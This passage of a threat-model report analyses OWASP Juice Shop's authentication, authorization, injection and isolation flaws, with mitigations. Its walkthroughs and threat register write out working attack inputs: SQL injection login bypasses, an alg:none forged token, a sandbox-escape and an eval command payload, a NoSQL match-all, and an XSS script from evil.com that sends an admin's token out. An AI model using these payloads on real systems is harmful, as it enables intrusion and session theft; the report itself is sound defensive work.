**Key takeaway:** The authentication chain has three independent critical breaks — SQL injection bypasses credential check, alg:none bypasses signature verification, and the hardcoded private key enables offline forgery — any single break yields admin access without needing the others.

**Structural defects:**

- Private key co-located with signing and verification code at [lib/insecurity.ts](vscode://file/home/mrohr/juice-shop/lib/insecurity.ts) — no key isolation
- Algorithm enforcement absent on `jws.verify()` at [lib/insecurity.ts:57](vscode://file/home/mrohr/juice-shop/lib/insecurity.ts:57) — alg:none accepted
- Private key in source code — anyone with GitHub access forges tokens offline
- Token stored in localStorage at [frontend/src/app/Services/request.interceptor.ts:13](vscode://file/home/mrohr/juice-shop/frontend/src/app/Services/request.interceptor.ts:13) — XSS-extractable
- Token revocation not possible — compromised tokens remain valid until expiry
- express-jwt 0.1.3 is approximately 8 major versions behind current
- Login query at [routes/login.ts:34](vscode://file/home/mrohr/juice-shop/routes/login.ts:34) is directly injectable

**Impact.** An attacker with internet access can forge administrator JWTs offline using the public GitHub source. Full session theft on any XSS via localStorage. SQL injection on the login endpoint bypasses authentication entirely without needing a token.

**Target architecture.** Delegate authentication to an external identity provider using OIDC; verify signatures via the IdP's published JWKS endpoint and enforce RS256. Store tokens in httpOnly Secure SameSite=Strict cookies. Retire express-jwt 0.1.3 in favor of jose or equivalent.

**Linked threats:**

- [T-001](#t-001) — Hardcoded RSA private key
- [T-002](#t-002) — JWT alg:none bypass
- [T-003](#t-003) — SQL injection on login
- [T-014](#t-014) — JWT in localStorage

#### 2.5.5 Authorization & Access Control

**Current state.** Role-based access defined at [lib/insecurity.ts:144](vscode://file/home/mrohr/juice-shop/lib/insecurity.ts:144) with four roles: customer, deluxe, accounting, admin. Route-level enforcement via `isAuthorized()` middleware applied inconsistently in [server.ts:355-383](vscode://file/home/mrohr/juice-shop/server.ts:355). No centralized authorization policy decision point. Resource ownership is checked per-route without a shared abstraction.

**Structural defects:**

- No centralized authorization policy — each route implements its own logic inconsistently
- Ownership checks absent on basket at [routes/basket.ts:19](vscode://file/home/mrohr/juice-shop/routes/basket.ts:19) — IDOR across all users
- UserId taken from `req.body` at [routes/memory.ts:7](vscode://file/home/mrohr/juice-shop/routes/memory.ts:7) — attacker controls which user's data to write
- Admin role assignable by attacker at registration — no server-side role assignment at [routes/verify.ts:52](vscode://file/home/mrohr/juice-shop/routes/verify.ts:52)
- Admin panel enforced only by client-side Angular `AdminGuard` — trivially bypassed
- Several endpoints lack any authorization: `/api/Deliverys`, `/rest/memories` (GET), `/rest/track-order/:id`

**Impact.** Any authenticated user can read and modify other users' baskets, wallets, and memories. Any unauthenticated user can register as admin. The admin panel is accessible to any user who knows the URL.

**Target architecture.** Implement a shared `ensureOwnership(model, userId)` middleware that verifies resource ownership before any data access. Derive UserId exclusively from the verified JWT payload, never from request body. Enforce admin role server-side with a dedicated `isAdmin()` middleware.

**Linked threats:**

- [T-005](#t-005) — Admin role via registration
- [T-007](#t-007) — Systemic IDOR
- [T-024](#t-024) — Client-side admin guard

#### 2.5.6 Input Validation & Output Encoding

**Current state.** No centralized input validation gateway. Individual routes apply ad-hoc length limits (search: 200 chars) and type checks. sanitize-html 1.4.2 is available at [lib/insecurity.ts:60](vscode://file/home/mrohr/juice-shop/lib/insecurity.ts:60) but is severely outdated and bypassed in the frontend with `bypassSecurityTrustHtml()`.

**Structural defects:**

- No request schema validation (no Joi, zod, or express-validator applied to API inputs)
- SQL queries built via string interpolation at [routes/login.ts:34](vscode://file/home/mrohr/juice-shop/routes/login.ts:34) and [routes/search.ts:23](vscode://file/home/mrohr/juice-shop/routes/search.ts:23)
- User-controlled JavaScript evaluated via `eval()` in two code paths
- sanitize-html 1.4.2 has known XSS bypasses — outdated by approximately 2 major versions
- Angular XSS protection disabled via bypassSecurityTrustHtml() in 6+ components
- XML parsed with entity expansion enabled (noent:true) at [routes/fileUpload.ts:83](vscode://file/home/mrohr/juice-shop/routes/fileUpload.ts:83)

**Impact.** Injection vulnerabilities exist across SQL, NoSQL, XML, YAML, and JavaScript evaluation contexts. An attacker can choose from multiple injection vectors based on the available attack surface.

**Target architecture.** Apply Joi or zod schema validation as Express middleware for all API routes. Replace all raw SQL with Sequelize parameterized queries. Remove all eval() usage. Upgrade sanitize-html to 2.x. Remove bypassSecurityTrustHtml() calls.

**Linked threats:**

- [T-003](#t-003), [T-006](#t-006) — SQL injection
- [T-010](#t-010) — NoSQL injection
- [T-013](#t-013) — XSS
- [T-016](#t-016) — XXE

#### 2.5.7 Separation & Isolation

**Current state.** The application runs as a single Node.js process containing the Express API, static asset server, both in-process databases (SQLite, MarsDB), the chatbot, the file upload handler, and the B2B eval sandbox. Docker provides container isolation (non-root user, distroless image) but no intra-application isolation.

**Structural defects:**

- Both databases run in-process — SQLi grants immediate access to both stores
- No separate process/namespace for the B2B eval sandbox — RCE escapes to full Node.js process
- File system operations for uploads and log serving share the same process context
- No network segmentation between application tier and data tier
- Chatbot initialization downloads training data from a configurable remote URL — SSRF during startup

**Impact.** A successful injection or code execution in any component immediately compromises all components — there is no blast-radius containment. The B2B sandbox escape gives shell-equivalent access to everything in the container.

**Target architecture.** Separate the B2B evaluation into a dedicated worker process with no file system access and a strict resource limit. Move databases to separate containers with network-level access control. Apply separate mount namespaces for upload and log directories.

**Linked threats:**

- [T-020](#t-020) — B2B RCE
- [T-025](#t-025) — SQLite access via injection

#### 2.5.8 Defense-in-Depth

**Current state.** See [Technology Architecture diagram](#24-technology-architecture) for the runtime stack. The stack consists of: Browser → CORS (wildcard) → Helmet (partial) → Body Parser → Morgan → JWT middleware (no algorithm enforcement) → Route handlers (injection-vulnerable). There is no WAF layer, no API gateway, no anomaly detection, and no network segmentation.

**Structural defects:**

- No WAF or API gateway in front of the application
- CORS wildcard (server.ts:182) allows any origin to make credentialed requests
- Helmet applies only noSniff and frameguard — xssFilter is explicitly disabled at server.ts:187
- Rate limiting applied only to `/rest/user/reset-password` — login and search are unthrottled
- No anomaly detection or behavioral analysis of request patterns
- No HSTS configured — downgrade attacks possible

**Impact.** An attacker can probe and exploit the application with no throttling on the critical injection endpoints. There is no layer that would detect or slow down an automated SQL injection attack.

**Target architecture.** Add an API gateway or reverse proxy (nginx, Caddy) in front of Express to enforce CORS, rate limiting globally, and a Content Security Policy header. Configure helmet.contentSecurityPolicy() with a strict policy. Enable HSTS. Consider adding a WAF rule set for OWASP Core Rule Set.

**Linked threats:**

- [T-011](#t-011) — CORS wildcard
- [T-008](#t-008) — Unauthenticated management endpoints

#### 2.5.9 Overall Architecture Security Rating

🔴 **Critical gaps — not suitable for production in any configuration.**

The application has systemic architectural failures across all eight evaluated security patterns. Private keys are hardcoded in publicly accessible source code. SQL queries are constructed by string interpolation. User input is evaluated as JavaScript in two separate production code paths. Both databases run in-process with no isolation boundary. The Angular frontend deliberately disables its own XSS protection in multiple locations. These are not implementation bugs to be fixed one by one — they represent a consistent architectural approach to intentional insecurity that is appropriate only for a training platform. Any deployment of this application outside an isolated training environment must be treated as a fully compromised environment from the moment of first deployment.

---

## 3. Attack Walkthroughs

The sequence diagrams below trace Critical findings from initial attacker action to full exploitation. Each diagram shows the current vulnerable behavior and the post-mitigation flow.

### Unauthenticated SQL Injection — Login Bypass (T-003)

This sequence shows how a crafted email parameter bypasses authentication entirely via SQL injection on the login endpoint, granting admin access without knowing any password.

```mermaid
sequenceDiagram
    participant A as Attacker
    participant API as Express API
    participant DB as SQLite

    Note over A,DB: Current state — T-003 (vulnerable)

    alt Current state — T-003
        A->>API: POST /rest/user/login email=admin@juice-sh.op'--  password=anything
        API->>DB: SELECT * FROM Users WHERE email = 'admin@juice-sh.op'-- ' AND password = '...'
        Note over DB: SQL comment removes password check
        DB-->>API: Returns admin user row (password check skipped)
        API-->>A: 200 OK — JWT token for admin account
        Note over A: Full admin access achieved with no password
    else After M-003 — Parameterized queries
        A->>API: POST /rest/user/login email=admin@juice-sh.op'-- password=anything
        API->>DB: UserModel.findOne(where: email=req.body.email AND password=hash)
        Note over DB: Parameters bound — SQL comment not interpreted
        DB-->>API: No user found
        API-->>A: 401 Invalid email or password
    end
```

### JWT Algorithm Confusion — alg:none Bypass (T-002)

This sequence shows how express-jwt 0.1.3 accepts a JWT with alg:none, allowing complete authentication bypass without knowing the private key.

```mermaid
sequenceDiagram
    participant A as Attacker
    participant API as Express API
    participant Auth as Auth Middleware

    Note over A,Auth: Current state — T-002 (vulnerable)

    alt Current state — T-002
        A->>A: Decode any JWT (public payload)
        A->>A: Modify header to alg: none
        A->>A: Set payload role: admin, id: 1
        A->>A: Remove signature (or use empty string)
        A->>API: GET /api/Users Authorization: Bearer eyJhbGciOiJub25lIn0.ADMIN_PAYLOAD.
        API->>Auth: jws.verify(token, publicKey)
        Note over Auth: jws.verify() does not enforce algorithm
        Auth-->>API: Decoded payload accepted as valid
        API-->>A: 200 OK — all user data returned
    else After M-002 — Algorithm enforcement
        A->>API: GET /api/Users Authorization: Bearer <alg:none token>
        API->>Auth: jwt.verify(token, publicKey, algorithms: RS256)
        Auth-->>API: JsonWebTokenError: invalid algorithm
        API-->>A: 401 Unauthorized
    end
```

### RCE via B2B Eval Sandbox Escape (T-020)

This sequence shows how the notevil sandbox can be escaped via prototype pollution, yielding remote code execution on the Node.js process.

```mermaid
sequenceDiagram
    participant A as Attacker
    participant API as Express API
    participant VM as vm sandbox
    participant OS as Node.js process

    Note over A,OS: Current state — T-020 (vulnerable)

    alt Current state — T-020
        A->>API: POST /rest/b2b/v2/orders orderLinesData=constructor.constructor('return process')().env
        API->>VM: vm.runInContext('safeEval(orderLinesData)', sandbox)
        Note over VM: notevil prototype pollution escape
        VM->>OS: Accesses process.env via constructor chain
        OS-->>VM: process object returned
        VM-->>API: Response with environment variables
        API-->>A: 200 — server-side data disclosed / RCE achieved
    else After M-019 — Declarative schema
        A->>API: POST /rest/b2b/v2/orders orderLinesData=constructor.constructor(...)
        API->>API: zod.parse() — not an array of productId/quantity
        API-->>A: 400 Bad Request — validation error
        Note over API: No eval(), no sandbox, no RCE possible
    end
```

### Systemic XSS via bypassSecurityTrustHtml (T-013)

This sequence shows how a persisted XSS payload submitted as feedback executes in the admin's browser, stealing their session token.

```mermaid
sequenceDiagram
    participant A as Attacker
    participant API as Express API
    participant AdminBrowser as Admin Browser
    participant EvilServer as Attacker's server

    Note over A,EvilServer: Current state — T-013 (vulnerable)

    alt Current state — T-013
        A->>API: POST /api/Feedbacks comment: script src=evil.com/steal.js script
        API-->>A: 201 Created (stored in DB)
        Note over AdminBrowser: Admin visits /administration
        AdminBrowser->>API: GET /api/Feedbacks
        API-->>AdminBrowser: feedback.comment returned as raw HTML
        Note over AdminBrowser: administration.component.ts bypassSecurityTrustHtml
        AdminBrowser->>AdminBrowser: innerHTML renders script tag
        AdminBrowser->>EvilServer: GET /steal.js?token=localStorage.token
        EvilServer-->>A: Admin JWT token received
        A->>API: All requests with stolen JWT as admin
    else After M-010 — Text interpolation
        AdminBrowser->>API: GET /api/Feedbacks
        API-->>AdminBrowser: feedback.comment returned as string
        Note over AdminBrowser: Template uses text interpolation only
        AdminBrowser->>AdminBrowser: Rendered as escaped text — no script execution
    end
```

---

## 4. Assets

The table below identifies all assets requiring protection, classified by sensitivity, with cross-references to threats that target them.

**Classification legend:** Restricted — highest sensitivity; Confidential — sensitive, limited distribution; Internal — internal use; Public — intentionally public.

| Asset | Classification | Description | Linked Threats |
|-------|---------------|-------------|----------------|
| JWT Private Signing Key | Restricted | RSA private key hardcoded in lib/insecurity.ts:23. Controls all session token validity. Publicly accessible via GitHub. | [T-001](#t-001) |
| User Credentials (Passwords) | Restricted | Email/password combinations; MD5-hashed with no salt. Admin default: admin123. | [T-003](#t-003), [T-004](#t-004), [T-006](#t-006) |
| Payment Card Data | Restricted | Full card numbers in SQLite CardModel. Last 4 digits returned in API. | [T-006](#t-006), [T-025](#t-025) |
| Alchemy API Key | Restricted | Ethereum node WebSocket API key hardcoded in routes/nftMint.ts:15. Public on GitHub. | [T-028](#t-028) |
| Encryption Keys Directory | Restricted | /encryptionkeys/ directory with jwt.pub downloadable unauthenticated. | [T-009](#t-009) |
| JWT Session Tokens | Confidential | RS256-signed 6h-expiry JWTs. Stored in localStorage (XSS-accessible). | [T-002](#t-002), [T-013](#t-013), [T-014](#t-014) |
| User PII (email, address) | Confidential | Email addresses, delivery addresses, security question answers. Stored in SQLite. | [T-006](#t-006), [T-007](#t-007), [T-025](#t-025) |
| Server Log Files | Internal | Application access logs at /support/logs/ — unauthenticated directory listing. Contains IP addresses, request paths. | [T-009](#t-009) |
| Order History / Basket Data | Internal | Purchase history and current basket for all users. Accessible via IDOR. | [T-007](#t-007) |
| Application Source Code | Internal | TypeScript source — public GitHub repo including hardcoded private keys and vulnerability code. | [T-001](#t-001), [T-028](#t-028) |
| Chatbot Training Data | Internal | Training JSON files in data/chatbot/; downloaded from configurable URL (SSRF vector during init). | [T-019](#t-019) |
| Product Catalog + Reviews | Public | Product data and reviews — NoSQL injection risk on review update. | [T-010](#t-010) |

## 5. Attack Surface

The attack surface is split by authentication requirement. Unauthenticated entry points represent the highest risk as they are reachable by any internet user without credentials.

### 5.1 Unauthenticated Entry Points (22)

Any anonymous user or automated scanner can reach these endpoints directly. They represent the primary external attack surface of the application.

| Entry Point | Protocol | Notes | Linked Threats |
|-------------|----------|-------|----------------|
| `POST /rest/user/login` | HTTP | SQL injection via raw string interpolation; brute-force with no account lockout | [T-003](#t-003), [T-005](#t-005) |
| `GET /rest/products/search` | HTTP | SQL injection via `q` parameter; unauthenticated search | [T-006](#t-006) |
| `POST /rest/user/reset-password` | HTTP | Security question bypass; predictable answers; rate-limited only partially | [T-026](#t-026) |
| `GET /rest/user/security-question` | HTTP | Username enumeration — reveals whether account exists | [T-026](#t-026) |
| `POST /file-upload` | HTTP | XXE, Zip Slip, YAML bomb; no auth required | [T-016](#t-016), [T-017](#t-017), [T-018](#t-018) |
| `POST /api/Users` | HTTP | User self-registration; no CAPTCHA; no email verification | [T-005](#t-005) |
| `POST /api/Feedbacks` | HTTP | Stored XSS via feedback comment field | [T-013](#t-013) |
| `GET /api/Deliverys` | HTTP | Delivery data exposed unauthenticated | [T-009](#t-009) |
| `GET /metrics` | HTTP | Prometheus metrics fully exposed — user counts, DB query times, heap | [T-008](#t-008) |
| `GET /api-docs` | HTTP | Swagger UI exposes full API schema | [T-009](#t-009) |
| `GET /ftp` | HTTP | Directory listing; direct download of sensitive files | [T-009](#t-009) |
| `GET /encryptionkeys` | HTTP | Directory listing of key files including JWT public key | [T-009](#t-009) |
| `GET /support/logs` | HTTP | Log file directory listing and download | [T-009](#t-009) |
| `GET /rest/admin/application-version` | HTTP | Version disclosure unauthenticated | [T-009](#t-009) |
| `GET /rest/admin/application-configuration` | HTTP | Full application config exposed unauthenticated | [T-009](#t-009) |
| `GET /rest/track-order/:id` | HTTP | Order tracking without auth | [T-009](#t-009) |
| `GET /rest/memories` | HTTP | Memory listing unauthenticated | [T-009](#t-009) |
| `GET /rest/chatbot/status` | HTTP | Chatbot status and training data URL exposed | [T-019](#t-019) |
| `POST /profile/image/file` | HTTP | Unauthenticated profile image file upload | [T-017](#t-017) |
| `POST /profile/image/url` | HTTP | SSRF via fully user-controlled URL parameter | [T-019](#t-019) |
| `GET /redirect` | HTTP | Open redirect — no allowlist enforcement | [T-030](#t-030) |
| `GET /rest/captcha` | HTTP | CAPTCHA endpoint unauthenticated; captcha trivially solvable | [T-005](#t-005) |

### 5.2 Authenticated Entry Points (13)

These endpoints require a valid JWT token but have authorization deficiencies that allow privilege escalation or data access beyond the authenticated user's scope.

| Entry Point | Protocol | Auth Required | Notes | Linked Threats |
|-------------|----------|---------------|-------|----------------|
| `GET /rest/basket/:id` | HTTP | JWT | IDOR — basket fetched by URL parameter without ownership check | [T-007](#t-007) |
| `POST /rest/basket/:id/checkout` | HTTP | JWT | IDOR — can checkout any user's basket | [T-007](#t-007) |
| `GET /rest/order-history` | HTTP | JWT | Fetches by email — susceptible to header manipulation | [T-007](#t-007) |
| `PUT /rest/products/reviews` | HTTP | JWT | NoSQL injection via `_id` with `multi:true` — mass update across users | [T-010](#t-010) |
| `PUT /profile` | HTTP | JWT | SSTI via username field containing `#{...}` pattern; eval() sink | [T-022](#t-022) |
| `POST /profile/image/url` | HTTP | JWT | SSRF with user-controlled URL for profile image | [T-019](#t-019) |
| `POST /b2bOrder` | HTTP | JWT | RCE via notevil sandbox escape with user-controlled order data | [T-020](#t-020) |
| `PUT /api/Products/:id` | HTTP | JWT | Missing auth on product update (commented-out middleware) | [T-007](#t-007) |
| `PUT /api/Users/:id` | HTTP | JWT | Role field writable by user — privilege escalation to admin | [T-025](#t-025) |
| `POST /rest/wallet/balance/update` | HTTP | JWT | Balance manipulation via negative amounts | [T-027](#t-027) |
| `POST /rest/memories` | HTTP | JWT | UserId in request body can be manipulated | [T-007](#t-007) |
| `PUT /api/SecurityAnswers` | HTTP | JWT | Security answer update without re-authentication | [T-026](#t-026) |
| `POST /rest/user/change-password` | HTTP | JWT | Password change without current password verification | [T-026](#t-026) |

---

## 6. Trust Boundaries

The application has a flat trust model with minimal enforcement between zones. The Angular SPA communicates directly with the Express REST API over HTTP, with no BFF layer, no API gateway, and no WAF in the default deployment.

| # | Boundary | From | To | Enforcement Mechanism | Key Weakness | Linked Threats |
|---|----------|------|----|-----------------------|--------------|----------------|
| 1 | Browser ↔ CDN/Load Balancer | End User (browser) | Reverse Proxy / CDN | TLS (assumed at proxy) | No TLS in container; CORS allows all origins; no HSTS in-container | [T-011](#t-011), [T-014](#t-014) |
| 2 | Internet ↔ Express API | Public Internet | Node.js Express server (port 3000) | JWT bearer token on authenticated routes | 22 unauthenticated routes; JWT uses hardcoded key; algorithm confusion bypass | [T-001](#t-001), [T-002](#t-002), [T-003](#t-003), [T-009](#t-009) |
| 3 | Angular SPA ↔ REST API | Browser (SPA) | Express REST API | Same-origin + JWT | CORS unrestricted (`cors()` wildcard); no CSRF protection; token in localStorage | [T-011](#t-011), [T-012](#t-012), [T-014](#t-014) |
| 4 | Express API ↔ SQLite | Application Layer | SQLite (in-process) | Sequelize ORM (partial) | Raw `sequelize.query()` with string interpolation bypasses ORM parameterization | [T-003](#t-003), [T-006](#t-006) |
| 5 | Express API ↔ MarsDB | Application Layer | MarsDB (in-process, MongoDB-compatible) | None | User-controlled `_id` with `multi:true` enables mass update across all documents | [T-010](#t-010) |
| 6 | Express API ↔ External Services | Application Layer | Alchemy WSS, external URLs (SSRF), chatbot training URL | None (direct fetch) | No allowlist for outbound HTTP; no SSRF prevention; API keys hardcoded in source | [T-019](#t-019), [T-028](#t-028) |

**Boundary notes:** Boundary 2 is the most critical — 22 unauthenticated endpoints include dangerous operations (XXE, SQLi, file upload). Boundary 3 has no CSRF protection because the application relies on JWT bearer tokens, but the wildcard CORS configuration defeats this assumption for cross-origin requests. Boundary 6 has no outbound allow-list — any URL reachable from the container can be fetched via the SSRF vector at `routes/profileImageUrlUpload.ts:24`.

---

## 7. Identified Security Controls

**Gap summary:** The most critical control gaps are: (1) authentication relies on a hardcoded RSA private key and a JWT library so outdated it cannot enforce algorithm binding, allowing complete authentication bypass via `alg:none`; (2) SQL queries use raw string interpolation throughout login and search routes, bypassing all ORM parameterization controls; (3) the application has no CSRF protection — csurf middleware is absent and the wildcard CORS policy nullifies the SameSite implicit protection; (4) Content Security Policy is injected with user-controlled data from the profile image field, allowing CSP self-bypass; (5) there is no input validation layer — XML, YAML, zip archives, and code expressions are parsed from user-supplied data with dangerous flags enabled (`noent:true`, unsafe YAML loader, notevil sandbox, eval()).

Legend: ✅ Adequate | ⚠️ Partial | 🔶 Weak | ❌ Missing

| Domain | Control | Implementation | Effectiveness | Linked Threats |
|--------|---------|----------------|---------------|----------------|
| IAM | JWT Authentication | [lib/insecurity.ts:54](vscode://file/home/mrohr/juice-shop/lib/insecurity.ts:54) — express-jwt 0.1.3 middleware | 🔶 Weak | [T-001](#t-001), [T-002](#t-002) |
| IAM | Password Hashing | [lib/insecurity.ts:42](vscode://file/home/mrohr/juice-shop/lib/insecurity.ts:42) — MD5 (cryptographically broken) | 🔶 Weak | [T-004](#t-004) |
| IAM | Session Management | In-memory token map; 6-hour JWT expiry | 🔶 Weak | [T-002](#t-002), [T-014](#t-014) |
| Authorization | Route Authorization | [server.ts:355-383](vscode://file/home/mrohr/juice-shop/server.ts:355) — isAuthorized() middleware applied inconsistently | ⚠️ Partial | [T-007](#t-007), [T-009](#t-009) |
| Authorization | Object-Level Auth | No ownership check on basket, memory, wallet endpoints | ❌ Missing | [T-007](#t-007), [T-025](#t-025) |
| Authorization | Role-Based Access | Admin role checked in some routes; client-writable `role` field | 🔶 Weak | [T-025](#t-025) |
| Data Protection | Transport Encryption | TLS terminated at reverse proxy (assumed); no in-container TLS | ⚠️ Partial | [T-011](#t-011) |
| Data Protection | Secret Management | Hardcoded RSA key, HMAC key, Alchemy API key in source | ❌ Missing | [T-001](#t-001), [T-004](#t-004), [T-028](#t-028) |
| Data Protection | Sensitive Data Storage | JWT in localStorage; passwords as MD5 | 🔶 Weak | [T-004](#t-004), [T-014](#t-014) |
| Input Validation | SQL Query Safety | Raw `sequelize.query()` string interpolation at login/search | ❌ Missing | [T-003](#t-003), [T-006](#t-006) |
| Input Validation | XML/File Parsing | `libxml.parseXml(..., { noent: true })` at [routes/fileUpload.ts:83](vscode://file/home/mrohr/juice-shop/routes/fileUpload.ts:83) | ❌ Missing | [T-016](#t-016), [T-018](#t-018) |
| Input Validation | Output Encoding | `sanitize-html 1.4.2` (outdated, bypassable); multiple `bypassSecurityTrustHtml()` calls | 🔶 Weak | [T-013](#t-013) |
| Input Validation | CSRF Protection | No csurf middleware; origin header checked for one challenge only | ❌ Missing | [T-012](#t-012) |
| Audit & Logging | Application Logging | Morgan HTTP logger present; log files exposed at `/support/logs` | 🔶 Weak | [T-008](#t-008), [T-009](#t-009) |
| Audit & Logging | Security Event Logging | Challenge solve events logged; no dedicated security event stream | ⚠️ Partial | [T-015](#t-015) |
| Infrastructure | Security Headers | helmet 4.6.0 partial; xssFilter disabled; CSP injectable; CORS wildcard | 🔶 Weak | [T-011](#t-011), [T-012](#t-012), [T-023](#t-023) |
| Infrastructure | Rate Limiting | express-rate-limit 7.x applied only to `/rest/user/reset-password` and a few endpoints | ⚠️ Partial | [T-005](#t-005) |
| Dependency | Supply Chain | express-jwt 0.1.3, jsonwebtoken 0.4.0, notevil 1.3.3 — critically outdated | 🔶 Weak | [T-020](#t-020), [T-024](#t-024) |
| Security Testing | SAST | CodeQL via GitHub Actions (codeql-analysis.yml) | ✅ Adequate | — |
| Security Testing | DAST | OWASP ZAP scan via GitHub Actions (zap_scan.yml) | ✅ Adequate | — |
| Security Testing | Container Scanning | Docker container scan in ci.yml | ✅ Adequate | — |


---

## 8. Threat Register

This register covers all 30 identified threats across the 8 analyzed components. Threats are organized by risk level. Each row references the corresponding mitigation(s) in Section 9.

**Risk Distribution:** Critical: 10 · High: 15 · Medium: 4 · Low: 1 · **Total: 30**

**STRIDE Coverage:** Spoofing: 4 · Tampering: 8 · Repudiation: 2 · Information Disclosure: 9 · Denial of Service: 3 · Elevation of Privilege: 4

### 8.1 Critical (10)

Immediate exploitation risk. These threats are confirmed via code analysis with no mitigating controls.

| ID | Component | STRIDE | Threat Scenario | Likelihood | Impact | Risk | Controls in Place | Mitigations |
|----|-----------|--------|-----------------|------------|--------|------|-------------------|-------------|
| <a id="t-001"></a>T-001 | auth-service | Spoofing | Attacker extracts the hardcoded RSA private key from [lib/insecurity.ts:23](vscode://file/home/mrohr/juice-shop/lib/insecurity.ts:23) (embedded PEM block in source) and forges arbitrary JWT tokens for any user including admin, achieving full authentication bypass. CWE-321. | High | Critical | 🔴 Critical | None — key is visible in plaintext source | [M-001](#m-001) |
| <a id="t-002"></a>T-002 | auth-service | Spoofing | `jws.verify()` at [lib/insecurity.ts:57](vscode://file/home/mrohr/juice-shop/lib/insecurity.ts:57) does not enforce algorithm — attacker sends a token with `alg:none` header to bypass signature verification entirely. express-jwt 0.1.3 does not reject unsigned tokens. CWE-347. | High | Critical | 🔴 Critical | None — algorithm field is attacker-controlled | [M-001](#m-001), [M-002](#m-002) |
| <a id="t-003"></a>T-003 | rest-api | Tampering | Raw SQL injection at [routes/login.ts:34](vscode://file/home/mrohr/juice-shop/routes/login.ts:34) — `SELECT * FROM Users WHERE email = '${req.body.email}'` allows `' OR '1'='1` to log in as any user or dump all credentials. CWE-89. | High | Critical | 🔴 Critical | None — ORM parameterization bypassed | [M-003](#m-003) |
| <a id="t-005"></a>T-005 | rest-api | Denial of Service | Brute-force login: no account lockout at `/rest/user/login`; rate limiting absent on login endpoint; weak passwords accepted at registration. Attacker can enumerate and compromise accounts at scale. CWE-307. | High | Critical | 🔴 Critical | Rate limit on password reset only; not on login | [M-004](#m-004), [M-005](#m-005) |
| <a id="t-006"></a>T-006 | rest-api | Information Disclosure | SQL injection at [routes/search.ts:23](vscode://file/home/mrohr/juice-shop/routes/search.ts:23) via unauthenticated `GET /rest/products/search?q=` — attacker dumps the entire SQLite database including user credentials, orders, and card data via UNION injection. CWE-89. | High | Critical | 🔴 Critical | None | [M-003](#m-003) |
| <a id="t-009"></a>T-009 | rest-api | Information Disclosure | Multiple unauthenticated management interfaces: `/ftp` ([server.ts:269](vscode://file/home/mrohr/juice-shop/server.ts:269)) directory listing with sensitive files, `/encryptionkeys` ([server.ts:277](vscode://file/home/mrohr/juice-shop/server.ts:277)) with JWT public key, `/support/logs` ([server.ts:281](vscode://file/home/mrohr/juice-shop/server.ts:281)) with server logs, `/rest/admin/application-configuration` — all reachable without any authentication. CWE-548. | High | Critical | 🔴 Critical | None | [M-006](#m-006) |
| <a id="t-013"></a>T-013 | frontend-spa | Tampering | Stored XSS: feedback comments rendered via `bypassSecurityTrustHtml()` at [about.component.ts:119](vscode://file/home/mrohr/juice-shop/frontend/src/app/about/about.component.ts:119) and [administration.component.ts:60,78](vscode://file/home/mrohr/juice-shop/frontend/src/app/administration/administration.component.ts:60). Attacker injects `<script>` or event handlers that execute for all viewing users, enabling session hijacking (JWT from localStorage). CWE-79. | High | Critical | 🔴 Critical | sanitize-html 1.4.2 (bypassable); xssFilter disabled | [M-010](#m-010), [M-011](#m-011) |
| <a id="t-020"></a>T-020 | b2b-processor | Elevation of Privilege | RCE via notevil sandbox escape at [routes/b2bOrder.ts:21-24](vscode://file/home/mrohr/juice-shop/routes/b2bOrder.ts:21): `vm.runInContext('safeEval(orderLinesData)', sandbox)` where `orderLinesData` is user-controlled JSON. Known notevil 1.3.3 escapes allow execution of arbitrary Node.js code on the server. CWE-94. | High | Critical | 🔴 Critical | notevil sandbox (known escapes) | [M-019](#m-019) |
| <a id="t-022"></a>T-022 | rest-api | Elevation of Privilege | SSTI/RCE via `eval()` at [routes/userProfile.ts:~55](vscode://file/home/mrohr/juice-shop/routes/userProfile.ts:55) — when username contains `#{...}` pattern, the expression inside is passed to `eval()`. Attacker sets username to `#{require('child_process').execSync('id')}` to execute arbitrary OS commands. CWE-94. | High | Critical | 🔴 Critical | None | [M-020](#m-020) |
| <a id="t-025"></a>T-025 | rest-api | Elevation of Privilege | Client-controlled role assignment: `PUT /api/Users/:id` accepts a `role` field in request body that is written directly to the database. Any authenticated user can set their own role to `admin` via `{"role":"admin"}` PATCH request. CWE-269. | High | Critical | 🔴 Critical | None — role field not server-enforced | [M-021](#m-021) |

### 8.2 High (15)

Significant risk requiring attention within the current sprint. These threats have confirmed code-level evidence.

| ID | Component | STRIDE | Threat Scenario | Likelihood | Impact | Risk | Controls in Place | Mitigations |
|----|-----------|--------|-----------------|------------|--------|------|-------------------|-------------|
| <a id="t-004"></a>T-004 | auth-service | Information Disclosure | Passwords stored as unsalted MD5 hashes ([lib/insecurity.ts:42](vscode://file/home/mrohr/juice-shop/lib/insecurity.ts:42)). MD5 is broken for password storage — entire user table crackable in seconds with rainbow tables. Hardcoded HMAC key `pa4qacea4VK9****` at line 43. CWE-916. | High | High | 🟠 High | MD5 hash applied | [M-001](#m-001), [M-022](#m-022) |
| <a id="t-007"></a>T-007 | rest-api | Tampering | IDOR on basket endpoint ([routes/basket.ts:19](vscode://file/home/mrohr/juice-shop/routes/basket.ts:19)): `BasketModel.findOne({ where: { id } })` — attacker accesses or modifies any user's basket by changing the URL parameter. Same pattern on `/rest/memories` ([routes/memory.ts:7](vscode://file/home/mrohr/juice-shop/routes/memory.ts:7)) via `req.body.UserId`. CWE-639. | High | High | 🟠 High | JWT required (not ownership check) | [M-007](#m-007) |
| <a id="t-008"></a>T-008 | rest-api | Information Disclosure | `/metrics` Prometheus endpoint exposed unauthenticated ([server.ts:718](vscode://file/home/mrohr/juice-shop/server.ts:718)) — leaks active user count, request rates, DB query durations, Node.js heap, process CPU — valuable for targeted DoS and infrastructure mapping. CWE-200. | High | High | 🟠 High | None | [M-006](#m-006) |
| <a id="t-010"></a>T-010 | data-layer | Tampering | NoSQL injection in review update ([routes/updateProductReviews.ts:14](vscode://file/home/mrohr/juice-shop/routes/updateProductReviews.ts:14)): `db.reviewsCollection.update({ _id: req.body.id }, ..., { multi: true })`. Attacker sends `{"id": {}}` to match all documents and overwrite every review with their content. CWE-943. | High | High | 🟠 High | JWT required | [M-009](#m-009) |
| <a id="t-011"></a>T-011 | rest-api | Information Disclosure | CORS wildcard: `app.use(cors())` at [server.ts:182](vscode://file/home/mrohr/juice-shop/server.ts:182) allows any origin to make credentialed cross-origin requests. Combined with missing CSRF protection, any malicious website can trigger authenticated API calls from a victim's browser. CWE-942. | High | High | 🟠 High | None | [M-008](#m-008) |
